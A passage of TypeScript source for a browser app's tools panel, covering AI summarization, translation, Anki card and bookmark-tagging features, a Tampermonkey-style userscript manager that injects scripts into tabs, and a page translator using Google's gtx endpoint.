    ?.addEventListener("click", async () => {
      const f = fileEl?.files?.[0];
      if (!f) {
        status("ファイルを選択してください");
        return;
      }
      status(`ファイル読込中 (${f.name})…`);
      try {
        let text = await fileToText(f);
        // HTML 系は本文抽出
        if (/\.html?$/i.test(f.name)) {
          text = extractMainText(text).text;
        }
        // SRT/VTT は時刻削除
        if (/\.(srt|vtt)$/i.test(f.name)) {
          text = text
            .split(/\r?\n/)
            .filter(
              (l) =>
                l.trim() &&
                !/^\d+$/.test(l.trim()) &&
                !/-->/.test(l) &&
                !/^WEBVTT/.test(l),
            )
            .join(" ");
        }
        const max = 60000;
        if (text.length > max) text = text.slice(0, max) + "\n\n[…以下省略]";
        void aiInvoke(
          out,
          "あなたは正確な要約者です。日本語 Markdown で簡潔に。",
          `次のファイル (${f.name}) を日本語で要約してください。\n\n# 出力\n## 概要 (3 行)\n## 要点\n## 詳細\n## キーワード\n\n# 内容\n${text}`,
          status,
        );
      } catch (e) {
        status(`エラー: ${String(e)}`);
      }
    });
}

// --- 🌍 多言語翻訳 (新タブ) ---

function setupAIMultiTranslate(): void {
  const goBtn = document.getElementById("ai-mt-go") as HTMLButtonElement | null;
  const langSel = document.getElementById(
    "ai-mt-lang",
  ) as HTMLSelectElement | null;
  const parallelEl = document.getElementById(
    "ai-mt-parallel",
  ) as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!goBtn || !langSel) return;

  goBtn.addEventListener("click", async () => {
    const lang = langSel.value;
    const parallel = !!parallelEl?.checked;
    const settings = getAISettingsOrAlert(status);
    if (!settings) return;
    try {
      status(`${lang} に翻訳中…`);
      const page = await aiEnsurePage();
      const max = 30000;
      const src =
        page.text.length > max
          ? page.text.slice(0, max) + " […省略]"
          : page.text;
      aiAbort?.abort();
      aiAbort = new AbortController();
      const result = await callOpenAICompatible(
        settings,
        [
          {
            role: "system",
            content: `あなたは正確な翻訳者です。出力は ${lang} のみ。前置きや解説は不要。Markdown 構造を保つ。`,
          },
          {
            role: "user",
            content: `次のページを ${lang} に翻訳してください。\n\n# タイトル\n${page.title}\n\n# 本文\n${src}`,
          },
        ],
        aiAbort.signal,
      );
      aiAbort = null;
      const escaped = (s: string): string =>
        s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      const body = parallel
        ? `<div class="col"><h2>原文</h2><pre>${escaped(page.text.slice(0, max))}</pre></div><div class="col"><h2>${escaped(lang)}</h2><pre>${escaped(result)}</pre></div>`
        : `<div class="col full"><h2>${escaped(lang)}</h2><pre>${escaped(result)}</pre></div>`;
      const html = `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>${escaped(page.title)} - ${escaped(lang)} 翻訳</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:16px;background:#fafafa;color:#222;line-height:1.7}
h1{font-size:18px;margin:0 0 12px}
h2{font-size:14px;margin:0 0 8px;color:#666;border-bottom:1px solid #ddd;padding-bottom:4px}
.wrap{display:flex;gap:16px}
.col{flex:1;min-width:0;background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:12px}
.col.full{flex:1}
pre{white-space:pre-wrap;word-wrap:break-word;font-family:inherit;margin:0;font-size:14px}
.src{font-size:12px;color:#888;margin-bottom:12px}
.src a{color:#48a}
</style></head><body>
<h1>🌍 ${escaped(lang)} 翻訳</h1>
<div class="src">原文: <a href="${escaped(page.url)}">${escaped(page.url)}</a></div>
<div class="wrap">${body}</div>
</body></html>`;
      const dataUrl =
        "data:text/html;charset=utf-8;base64," +
        btoa(unescape(encodeURIComponent(html)));
      await tabNew(dataUrl);
      status(`${lang} 翻訳タブを開きました`);
    } catch (e) {
      if ((e as Error).name !== "AbortError") status(`エラー: ${String(e)}`);
    }
  });
}

// --- 🎴 Anki カード ---

let aiAnkiLastCsv = "";

function setupAIAnki(): void {
  const goBtn = document.getElementById(
    "ai-anki-go",
  ) as HTMLButtonElement | null;
  const csvBtn = document.getElementById(
    "ai-anki-csv",
  ) as HTMLButtonElement | null;
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!goBtn || !out) return;

  goBtn.addEventListener("click", async () => {
    const count = Math.max(
      3,
      Math.min(
        40,
        Number(
          (document.getElementById("ai-anki-count") as HTMLInputElement | null)
            ?.value,
        ) || 10,
      ),
    );
    const level =
      (document.getElementById("ai-anki-level") as HTMLSelectElement | null)
        ?.value || "標準";
    try {
      status("ページ取得中…");
      const page = await aiEnsurePage();
      const text = await aiInvoke(
        out,
        "あなたは熟練の学習設計者です。出力は厳密に JSON 配列のみ (前置きや ``` も付けない)。各要素は { front, back } の 2 フィールドだけ。",
        `次のページから「${level}」レベルの暗記カードを ${count} 枚生成してください。\n- front: 50 文字以内の問い\n- back: 200 文字以内の答え (具体的に)\n- 重複を避け、ページ内容に基づく事実のみ\n\n# ページタイトル\n${page.title}\n\n# 本文\n${page.text.slice(0, 30000)}`,
        status,
      );
      // JSON 抽出
      const m = text.match(/\[[\s\S]*\]/);
      if (!m) {
        status("JSON が抽出できませんでした");
        return;
      }
      const cards = JSON.parse(m[0]) as { front: string; back: string }[];
      const csv = cards
        .filter((c) => c && c.front && c.back)
        .map(
          (c) =>
            `${c.front.replace(/[\t\r\n]/g, " ")}\t${c.back.replace(/[\t\r\n]/g, " ")}`,
        )
        .join("\n");
      aiAnkiLastCsv = csv;
      out.value = `# ${cards.length} 枚生成しました\n\n${cards
        .map((c, i) => `## ${i + 1}. ${c.front}\n${c.back}`)
        .join(
          "\n\n",
        )}\n\n---\n\n# Anki 用 TSV (CSV ボタンで保存)\n\n\`\`\`\n${csv}\n\`\`\``;
      status(`${cards.length} 枚生成完了`);
    } catch (e) {
      status(`エラー: ${String(e)}`);
    }
  });

  csvBtn?.addEventListener("click", () => {
    if (!aiAnkiLastCsv) {
      status("先にカードを生成してください");
      return;
    }
    const blob = new Blob([aiAnkiLastCsv], {
      type: "text/tab-separated-values;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    a.href = url;
    a.download = `anki-${stamp}.tsv`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
}

// --- 🔖 ブックマーク AI 分類 ---

function setupAIBookmarkTag(): void {
  const goBtn = document.getElementById("ai-bm-go") as HTMLButtonElement | null;
  const limitEl = document.getElementById(
    "ai-bm-limit",
  ) as HTMLInputElement | null;
  const fetchEl = document.getElementById(
    "ai-bm-fetch",
  ) as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "ai-bm-status",
  ) as HTMLSpanElement | null;
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!goBtn || !out) return;

  goBtn.addEventListener("click", async () => {
    const limit = Math.max(1, Math.min(200, Number(limitEl?.value) || 20));
    const fetchBody = !!fetchEl?.checked;
    const settings = getAISettingsOrAlert(status);
    if (!settings) return;
    if (bookmarks.length === 0) {
      status("ブックマークがありません");
      return;
    }
    const items = bookmarks.slice(0, limit);
    out.value = `| # | タイトル | カテゴリ | タグ | 一言メモ |\n|---|---|---|---|---|\n`;
    aiAbort?.abort();
    aiAbort = new AbortController();
    try {
      for (let i = 0; i < items.length; i++) {
        const b = items[i];
        status(`分類中… (${i + 1}/${items.length})`);
        let snippet = "";
        if (fetchBody) {
          try {
            const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
              url: b.url,
              userAgent: null,
            });
            snippet = extractMainText(r.body).text.slice(0, 2000);
          } catch {
            /* noop */
          }
        }
        const userMsg = `URL: ${b.url}\nタイトル: ${b.title}\n${snippet ? `本文抜粋: ${snippet}` : ""}\n\n上記を分類してください。出力は JSON のみ: {"category":"...","tags":["..","..","..","..","..(最大5)"],"memo":"30 文字以内の一言"}`;
        try {
          const r = await callOpenAICompatible(
            settings,
            [
              {
                role: "system",
                content:
                  "あなたは情報整理の専門家です。出力は厳密に JSON 1 オブジェクトのみ (``` 不要)。日本語で。",
              },
              { role: "user", content: userMsg },
            ],
            aiAbort.signal,
          );
          const m = r.match(/\{[\s\S]*\}/);
          if (!m) throw new Error("JSON 抽出失敗");
          const j = JSON.parse(m[0]) as {
            category?: string;
            tags?: string[];
            memo?: string;
          };
          const tags = (j.tags || []).join(", ");
          const esc = (s: string): string =>
            s.replace(/\|/g, "\\|").replace(/\n/g, " ");
          out.value += `| ${i + 1} | [${esc(b.title || b.url)}](${b.url}) | ${esc(j.category || "?")} | ${esc(tags)} | ${esc(j.memo || "")} |\n`;
          out.scrollTop = out.scrollHeight;
        } catch (e) {
          if ((e as Error).name === "AbortError") {
            status("中断しました");
            return;
          }
          out.value += `| ${i + 1} | ${b.title} | (エラー) | | ${String(e).slice(0, 40)} |\n`;
        }
      }
      status(`完了: ${items.length} 件`);
    } finally {
      aiAbort = null;
    }
  });
}

// ===== 🐵 ユーザースクリプト (Tampermonkey 風) =====

interface UserScript {
  id: string;
  name: string;
  source: string;
  enabled: boolean;
  updatedAt: number;
}

interface UserScriptMeta {
  name: string;
  matches: string[];
  excludes: string[];
  runAt: "document-start" | "document-end" | "document-idle";
  grants: string[];
  noFrames: boolean;
}

const US_STORAGE_KEY = "yuzu-userscripts-v1";
const US_MASTER_KEY = "yuzu-userscripts-enabled-v1";
const US_GM_VALUES_PREFIX = "yuzu-gm-values-";

let userScripts: UserScript[] = [];
let usSelectedId: string | null = null;

function loadUserScripts(): UserScript[] {
  try {
    const raw = localStorage.getItem(US_STORAGE_KEY);
    if (!raw) return [];
    const arr = JSON.parse(raw) as UserScript[];
    if (!Array.isArray(arr)) return [];
    return arr.filter((s) => s && typeof s.source === "string");
  } catch {
    return [];
  }
}

function saveUserScripts(): void {
  try {
    localStorage.setItem(US_STORAGE_KEY, JSON.stringify(userScripts));
  } catch (e) {
    console.error("saveUserScripts failed:", e);
  }
}

function isUserScriptsEnabled(): boolean {
  return localStorage.getItem(US_MASTER_KEY) !== "0";
}

function setUserScriptsEnabled(b: boolean): void {
  localStorage.setItem(US_MASTER_KEY, b ? "1" : "0");
}

/** Greasemonkey ヘッダのパース */
function parseUserScriptMeta(source: string): UserScriptMeta {
  const meta: UserScriptMeta = {
    name: "",
    matches: [],
    excludes: [],
    runAt: "document-end",
    grants: [],
    noFrames: false,
  };
  const headerMatch = source.match(
    /\/\/\s*==UserScript==([\s\S]*?)\/\/\s*==\/UserScript==/,
  );
  if (!headerMatch) return meta;
  const lines = headerMatch[1].split(/\r?\n/);
  for (const line of lines) {
    const m = line.match(/^\s*\/\/\s*@(\S+)\s*(.*)$/);
    if (!m) continue;
    const key = m[1].toLowerCase();
    const val = (m[2] || "").trim();
    if (key === "name" && val) meta.name = val;
    else if (key === "match" || key === "include") meta.matches.push(val);
    else if (key === "exclude" || key === "exclude-match")
      meta.excludes.push(val);
    else if (key === "run-at") {
      const v = val.toLowerCase();
      if (
        v === "document-start" ||
        v === "document-end" ||
        v === "document-idle"
      )
        meta.runAt = v;
    } else if (key === "grant") meta.grants.push(val);
    else if (key === "noframes") meta.noFrames = true;
  }
  return meta;
}

/** Greasemonkey @match / @include パターンを RegExp に変換 */
function userScriptPatternToRegex(pattern: string): RegExp | null {
  if (!pattern) return null;
  if (pattern === "<all_urls>" || pattern === "*") return /^https?:\/\//i;
  // 正規表現リテラル形式 /.../flags
  const reLit = pattern.match(/^\/(.+)\/([a-z]*)$/);
  if (reLit) {
    try {
      return new RegExp(reLit[1], reLit[2]);
    } catch {
      return null;
    }
  }
  // glob 風 → regex
  const escaped = pattern
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*")
    .replace(/\?/g, ".");
  try {
    return new RegExp("^" + escaped + "$");
  } catch {
    return null;
  }
}

function urlMatchesUserScript(meta: UserScriptMeta, url: string): boolean {
  if (meta.matches.length === 0) return false;
  const matched = meta.matches.some((p) => {
    const r = userScriptPatternToRegex(p);
    return !!r && r.test(url);
  });
  if (!matched) return false;
  const excluded = meta.excludes.some((p) => {
    const r = userScriptPatternToRegex(p);
    return !!r && r.test(url);
  });
  return !excluded;
}

/** スクリプトを GM ラッパーで包んでページに注入する文字列を作る */
function buildUserScriptPayload(s: UserScript, meta: UserScriptMeta): string {
  const valueKey = US_GM_VALUES_PREFIX + s.id;
  const payload = {
    id: s.id,
    name: meta.name || s.name,
    source: s.source,
    grants: meta.grants,
    valueKey,
  };
  // ページ側に注入する関数本体 (IIFE)
  // 文字列リテラル化に注意: ユーザーソースは JSON.stringify で安全に渡す
  const fn = `(function(){
    try {
      var __cfg = ${JSON.stringify(payload)};
      // GM 値ストレージは window 内のメモリのみ (永続化は postMessage で UI 側に依頼するのが理想だが省略)
      var __gmValues = {};
      try {
        var raw = sessionStorage.getItem(__cfg.valueKey);
        if (raw) __gmValues = JSON.parse(raw);
      } catch(e){}
      function persist(){
        try { sessionStorage.setItem(__cfg.valueKey, JSON.stringify(__gmValues)); } catch(e){}
      }
      var GM_setValue = function(k, v){ __gmValues[k] = v; persist(); };
      var GM_getValue = function(k, d){ return Object.prototype.hasOwnProperty.call(__gmValues,k) ? __gmValues[k] : d; };
      var GM_deleteValue = function(k){ delete __gmValues[k]; persist(); };
      var GM_listValues = function(){ return Object.keys(__gmValues); };
      var GM_addStyle = function(css){
        var st = document.createElement('style');
        st.type = 'text/css';
        st.textContent = String(css);
        (document.head || document.documentElement).appendChild(st);
        return st;
      };
      var GM_setClipboard = function(text){
        try { navigator.clipboard.writeText(String(text)); } catch(e){}
      };
      var GM_openInTab = function(url){
        try { window.open(url, '_blank'); } catch(e){}
      };
      var GM_log = function(){ try { console.log.apply(console, ['[US:'+__cfg.name+']'].concat([].slice.call(arguments))); } catch(e){} };
      var GM_xmlhttpRequest = function(opts){
        opts = opts || {};
        var ctrl = new AbortController();
        var headers = opts.headers || {};
        fetch(opts.url, {
          method: opts.method || 'GET',
          headers: headers,
          body: opts.data,
          credentials: opts.anonymous ? 'omit' : 'include',
          signal: ctrl.signal
        }).then(function(r){
          return r.text().then(function(t){
            var resp = {
              status: r.status,
              statusText: r.statusText,
              responseText: t,
              response: t,
              responseHeaders: ''
            };
            r.headers.forEach(function(v,k){ resp.responseHeaders += k+': '+v+'\\r\\n'; });
            if (opts.onload) opts.onload(resp);
          });
        }).catch(function(e){
          if (opts.onerror) opts.onerror({error: String(e)});
        });
        return { abort: function(){ ctrl.abort(); } };
      };
      var GM_registerMenuCommand = function(name, fn){ /* no-op */ };
      var GM_info = {
        script: { name: __cfg.name, grant: __cfg.grants, version: '1.0' },
        scriptHandler: 'yuzu-browser', version: '1.0'
      };
      var GM = {
        setValue: function(k,v){ return new Promise(function(res){ GM_setValue(k,v); res(); }); },
        getValue: function(k,d){ return Promise.resolve(GM_getValue(k,d)); },
        deleteValue: function(k){ return new Promise(function(res){ GM_deleteValue(k); res(); }); },
        listValues: function(){ return Promise.resolve(GM_listValues()); },
        addStyle: function(css){ return Promise.resolve(GM_addStyle(css)); },
        setClipboard: function(t){ return Promise.resolve(GM_setClipboard(t)); },
        openInTab: function(u){ return Promise.resolve(GM_openInTab(u)); },
        xmlHttpRequest: GM_xmlhttpRequest,
        info: GM_info
      };
      var unsafeWindow = window;
      // 実行
      (function(){
        try {
          eval(__cfg.source);
        } catch(e) {
          console.error('[yuzu UserScript:'+__cfg.name+']', e);
        }
      })();
    } catch(err) {
      console.error('[yuzu UserScript wrapper error]', err);
    }
  })();`;
  return fn;
}

function generateScriptId(): string {
  return (
    "us-" +
    Date.now().toString(36) +
    "-" +
    Math.random().toString(36).slice(2, 8)
  );
}

const DEFAULT_USERSCRIPT_TEMPLATE = `// ==UserScript==
// @name         New Script
// @match        *://*/*
// @run-at       document-end
// @grant        none
// ==/UserScript==

(function() {
  'use strict';
  console.log('Hello from yuzu UserScript!');
})();`;

/** ユーザースクリプトを指定タブに注入 */
async function injectUserScriptsForTab(
  tabId: number,
  url: string,
): Promise<void> {
  if (!isUserScriptsEnabled()) return;
  if (!/^https?:\/\//i.test(url)) return;
  let injected = 0;
  for (const s of userScripts) {
    if (!s.enabled) continue;
    const meta = parseUserScriptMeta(s.source);
    if (!urlMatchesUserScript(meta, url)) continue;
    const payload = buildUserScriptPayload(s, meta);
    // run-at による遅延 (document-start は即時、end は ~600ms、idle は ~1500ms)
    const delay =
      meta.runAt === "document-start"
        ? 0
        : meta.runAt === "document-end"
          ? 600
          : 1500;
    setTimeout(() => {
      void invoke("tab_eval_script", { id: tabId, script: payload }).catch(
        (e) => {
          appendUserScriptLog(
            `[${meta.name || s.name}] inject failed: ${String(e)}`,
          );
        },
      );
    }, delay);
    injected++;
  }
  if (injected > 0) {
    appendUserScriptLog(`▶ ${url} に ${injected} 個のスクリプトを注入予定`);
  }
}

function appendUserScriptLog(line: string): void {
  const log = document.getElementById("us-log") as HTMLPreElement | null;
  if (!log) return;
  const ts = new Date().toLocaleTimeString();
  log.textContent = `[${ts}] ${line}\n` + (log.textContent || "");
  // ログは最大 200 行に制限
  const lines = (log.textContent || "").split("\n");
  if (lines.length > 200) log.textContent = lines.slice(0, 200).join("\n");
}

function renderUserScriptList(): void {
  const list = document.getElementById("us-list") as HTMLUListElement | null;
  const empty = document.getElementById("us-empty") as HTMLDivElement | null;
  if (!list || !empty) return;
  list.innerHTML = "";
  if (userScripts.length === 0) {
    empty.hidden = false;
    return;
  }
  empty.hidden = true;
  for (const s of userScripts) {
    const meta = parseUserScriptMeta(s.source);
    const li = document.createElement("li");
    li.style.cssText =
      "padding:6px 8px;cursor:pointer;border-bottom:1px solid #eee;display:flex;align-items:center;gap:6px;" +
      (s.id === usSelectedId ? "background:#e6f0ff;" : "");
    const cb = document.createElement("input");
    cb.type = "checkbox";
    cb.checked = s.enabled;
    cb.title = "有効/無効";
    cb.addEventListener("click", (e) => e.stopPropagation());
    cb.addEventListener("change", () => {
      s.enabled = cb.checked;
      saveUserScripts();
    });
    li.appendChild(cb);
    const span = document.createElement("span");
    span.style.cssText =
      "flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:13px;";
    span.textContent = meta.name || s.name || "(無名)";
    span.title = `${meta.name || s.name}\n${meta.matches.join("\n")}`;
    li.appendChild(span);
    li.addEventListener("click", () => {
      usSelectedId = s.id;
      loadSelectedToEditor();
      renderUserScriptList();
    });
    list.appendChild(li);
  }
}

function loadSelectedToEditor(): void {
  const nameEl = document.getElementById("us-name") as HTMLInputElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const enEl = document.getElementById("us-enabled") as HTMLInputElement | null;
  if (!nameEl || !srcEl || !enEl) return;
  const s = userScripts.find((x) => x.id === usSelectedId);
  if (!s) {
    nameEl.value = "";
    srcEl.value = "";
    enEl.checked = true;
    return;
  }
  nameEl.value = s.name;
  srcEl.value = s.source;
  enEl.checked = s.enabled;
}

function saveCurrentEditor(): boolean {
  const nameEl = document.getElementById("us-name") as HTMLInputElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const enEl = document.getElementById("us-enabled") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "us-status",
  ) as HTMLSpanElement | null;
  if (!nameEl || !srcEl || !enEl) return false;
  const source = srcEl.value;
  const meta = parseUserScriptMeta(source);
  const name = (nameEl.value.trim() || meta.name || "(無名)").trim();
  if (!source.trim()) {
    if (statusEl) statusEl.textContent = "ソースが空です";
    return false;
  }
  let s = userScripts.find((x) => x.id === usSelectedId);
  if (!s) {
    s = {
      id: generateScriptId(),
      name,
      source,
      enabled: enEl.checked,
      updatedAt: Date.now(),
    };
    userScripts.push(s);
    usSelectedId = s.id;
  } else {
    s.name = name;
    s.source = source;
    s.enabled = enEl.checked;
    s.updatedAt = Date.now();
  }
  saveUserScripts();
  renderUserScriptList();
  if (statusEl) {
    statusEl.textContent = `保存: ${name} (@match: ${meta.matches.length}件, ${meta.runAt})`;
  }
  return true;
}

function setupUserScriptTool(): void {
  userScripts = loadUserScripts();
  const newBtn = document.getElementById("us-new") as HTMLButtonElement | null;
  const importBtn = document.getElementById(
    "us-import",
  ) as HTMLButtonElement | null;
  const importUrlBtn = document.getElementById(
    "us-import-url",
  ) as HTMLButtonElement | null;
  const runNowBtn = document.getElementById(
    "us-run-now",
  ) as HTMLButtonElement | null;
  const masterEl = document.getElementById(
    "us-master-enabled",
  ) as HTMLInputElement | null;
  const saveBtn = document.getElementById(
    "us-save",
  ) as HTMLButtonElement | null;
  const delBtn = document.getElementById(
    "us-delete",
  ) as HTMLButtonElement | null;
  const exportBtn = document.getElementById(
    "us-export",
  ) as HTMLButtonElement | null;
  const dupBtn = document.getElementById(
    "us-duplicate",
  ) as HTMLButtonElement | null;
  const srcEl = document.getElementById(
    "us-source",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "us-status",
  ) as HTMLSpanElement | null;
  if (!newBtn || !srcEl) return;

  if (masterEl) masterEl.checked = isUserScriptsEnabled();
  masterEl?.addEventListener("change", () => {
    setUserScriptsEnabled(!!masterEl.checked);
    appendUserScriptLog(`全体スイッチ: ${masterEl.checked ? "有効" : "無効"}`);
  });

  newBtn.addEventListener("click", () => {
    usSelectedId = null;
    const nameEl = document.getElementById(
      "us-name",
    ) as HTMLInputElement | null;
    const enEl = document.getElementById(
      "us-enabled",
    ) as HTMLInputElement | null;
    if (nameEl) nameEl.value = "New Script";
    if (enEl) enEl.checked = true;
    srcEl.value = DEFAULT_USERSCRIPT_TEMPLATE;
    renderUserScriptList();
    srcEl.focus();
  });

  saveBtn?.addEventListener("click", () => {
    saveCurrentEditor();
  });

  delBtn?.addEventListener("click", () => {
    if (!usSelectedId) return;
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) return;
    if (!confirm(`「${s.name}」を削除しますか?`)) return;
    userScripts = userScripts.filter((x) => x.id !== usSelectedId);
    usSelectedId = null;
    saveUserScripts();
    renderUserScriptList();
    loadSelectedToEditor();
    if (statusEl) statusEl.textContent = "削除しました";
  });

  exportBtn?.addEventListener("click", () => {
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) {
      if (statusEl) statusEl.textContent = "選択されていません";
      return;
    }
    const blob = new Blob([s.source], {
      type: "application/javascript;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    const safe = s.name.replace(/[^\w\-]+/g, "_") || "script";
    a.download = `${safe}.user.js`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  dupBtn?.addEventListener("click", () => {
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (!s) return;
    const copy: UserScript = {
      id: generateScriptId(),
      name: s.name + " (copy)",
      source: s.source,
      enabled: false,
      updatedAt: Date.now(),
    };
    userScripts.push(copy);
    usSelectedId = copy.id;
    saveUserScripts();
    renderUserScriptList();
    loadSelectedToEditor();
  });

  importBtn?.addEventListener("click", () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.accept = ".js,.user.js,text/javascript";
    inp.onchange = async (): Promise<void> => {
      const f = inp.files?.[0];
      if (!f) return;
      const text = await f.text();
      const meta = parseUserScriptMeta(text);
      const s: UserScript = {
        id: generateScriptId(),
        name: meta.name || f.name.replace(/\.user\.js$|\.js$/, ""),
        source: text,
        enabled: true,
        updatedAt: Date.now(),
      };
      userScripts.push(s);
      usSelectedId = s.id;
      saveUserScripts();
      renderUserScriptList();
      loadSelectedToEditor();
      if (statusEl) statusEl.textContent = `インポート: ${s.name}`;
    };
    inp.click();
  });

  importUrlBtn?.addEventListener("click", async () => {
    const url = prompt("UserScript の URL を入力 (.user.js)");
    if (!url) return;
    try {
      if (statusEl) statusEl.textContent = "取得中…";
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url,
        userAgent: null,
      });
      const text = r.body;
      const meta = parseUserScriptMeta(text);
      const s: UserScript = {
        id: generateScriptId(),
        name: meta.name || url.split("/").pop() || "script",
        source: text,
        enabled: true,
        updatedAt: Date.now(),
      };
      userScripts.push(s);
      usSelectedId = s.id;
      saveUserScripts();
      renderUserScriptList();
      loadSelectedToEditor();
      if (statusEl) statusEl.textContent = `インポート: ${s.name}`;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });

  runNowBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    const s = userScripts.find((x) => x.id === usSelectedId);
    if (s) {
      // 選択中のものを (パターン無視で) 強制実行
      const meta = parseUserScriptMeta(s.source);
      const payload = buildUserScriptPayload(s, meta);
      void invoke("tab_eval_script", { id: a.id, script: payload })
        .then(() => {
          if (statusEl) statusEl.textContent = `▶ 実行: ${meta.name || s.name}`;
        })
        .catch((e) => {
          if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
        });
    } else {
      // 何も選択していない場合は通常の URL マッチ実行
      void injectUserScriptsForTab(a.id, a.url);
      if (statusEl) statusEl.textContent = "URL マッチで再実行";
    }
  });

  // Ctrl+S で保存
  srcEl.addEventListener("keydown", (e) => {
    if (e.ctrlKey && e.key.toLowerCase() === "s") {
      e.preventDefault();
      saveCurrentEditor();
    }
  });

  renderUserScriptList();
  loadSelectedToEditor();
}

// ===== 🌐 ページ翻訳 (Google translate gtx 無料エンドポイント) =====

const TRANSLATE_LANG_KEY = "yuzu-translate-lang-v1";

function setupPageTranslate(): void {
  const sel = document.getElementById(
    "translate-lang",
  ) as HTMLSelectElement | null;
  if (!sel) return;

  // 「原文」(空) で初期化。言語設定の保存は復元しない (ページごとに選択し直す)。
  sel.value = "";

  function apply(mode: "translate" | "restore", target: string): void {
    const a = activeTab();
    if (!a) return;
    const script = buildTranslatePayload(target || "ja", mode);
    void invoke("tab_eval_script", { id: a.id, script }).catch((e) => {
      console.error("translate inject failed:", e);
    });
  }

  sel.addEventListener("change", () => {
    const v = sel.value;
    if (!v) {
      // 「原文」選択時は復元
      apply("restore", "");
    } else {
      // 既に翻訳済みの可能性があるので一旦復元してから翻訳
      apply("restore", "");
      setTimeout(() => apply("translate", v), 100);
    }
    localStorage.setItem(TRANSLATE_LANG_KEY, v);
  });
}

/** ページ内に注入する自己完結スクリプト */
function buildTranslatePayload(
  target: string,
  mode: "translate" | "restore" = "translate",
): string {
  return `(function(){
  try {
    var TARGET = ${JSON.stringify(target)};
    var MODE = ${JSON.stringify(mode)};
    var W = window;
    // 復元
    if (MODE === 'restore') {
      if (W.__yuzuTranslateState && W.__yuzuTranslateState.active) {
        var st = W.__yuzuTranslateState;
        st.entries.forEach(function(e){
          try { e.node.nodeValue = e.original; } catch(_) {}
        });
        st.active = false;
      }
      try {
        var b0 = document.getElementById('__yuzu_translate_banner');
        if (b0) b0.remove();
      } catch(_) {}
      return;
    }
    // 翻訳モード: 既に翻訳済みなら何もしない
    if (W.__yuzuTranslateState && W.__yuzuTranslateState.active) {
      return;
    }
    // バナー
    var banner = document.createElement('div');
    banner.id = '__yuzu_translate_banner';
    banner.textContent = '🌐 翻訳中... (' + TARGET + ')';
    banner.style.cssText = 'position:fixed;top:8px;right:8px;z-index:2147483647;background:#1f6feb;color:#fff;padding:6px 12px;border-radius:6px;font:13px/1.4 system-ui,sans-serif;box-shadow:0 2px 8px rgba(0,0,0,0.3);';
    document.documentElement.appendChild(banner);

    // テキストノード収集
    var SKIP_TAGS = {SCRIPT:1,STYLE:1,NOSCRIPT:1,CODE:1,PRE:1,TEXTAREA:1,KBD:1,SAMP:1,VAR:1};
    var entries = [];
    var walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, {
      acceptNode: function(n){
        if (!n.nodeValue) return NodeFilter.FILTER_REJECT;
        var t = n.nodeValue.replace(/\\s+/g,'').trim();
        if (!t) return NodeFilter.FILTER_REJECT;
        if (t.length < 2) return NodeFilter.FILTER_REJECT;
        var p = n.parentElement;
        while (p) {
          if (SKIP_TAGS[p.tagName]) return NodeFilter.FILTER_REJECT;
          if (p.isContentEditable) return NodeFilter.FILTER_REJECT;
          p = p.parentElement;
        }
        return NodeFilter.FILTER_ACCEPT;
      }
    });
    var node;
    while ((node = walker.nextNode())) {
      entries.push({ node: node, original: node.nodeValue });
    }
    if (entries.length === 0) {
      banner.textContent = '🌐 翻訳対象なし';
      setTimeout(function(){ try{ banner.remove(); }catch(_){} }, 1500);
      return;
    }

    W.__yuzuTranslateState = { active: true, entries: entries };

    // バッチング: 1リクエスト 4000 文字目安、区切り \\n\\n___YZ___\\n\\n
    var SEP = '\\n\\n___YZ___\\n\\n';
    var batches = [];
    var cur = [];
    var curLen = 0;
    for (var i = 0; i < entries.length; i++) {
      var t = entries[i].original;
      if (curLen + t.length > 3500 && cur.length > 0) {
        batches.push(cur);
        cur = [];
        curLen = 0;
      }
      cur.push(i);
      curLen += t.length + SEP.length;
    }
    if (cur.length) batches.push(cur);

    var done = 0;
    var total = batches.length;
    function update(){
      banner.textContent = '🌐 翻訳中... ' + done + '/' + total;
    }
    update();

    function translateBatch(idxs){
      var srcText = idxs.map(function(i){ return entries[i].original; }).join(SEP);
      var url = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=' + encodeURIComponent(TARGET) + '&dt=t&q=' + encodeURIComponent(srcText);
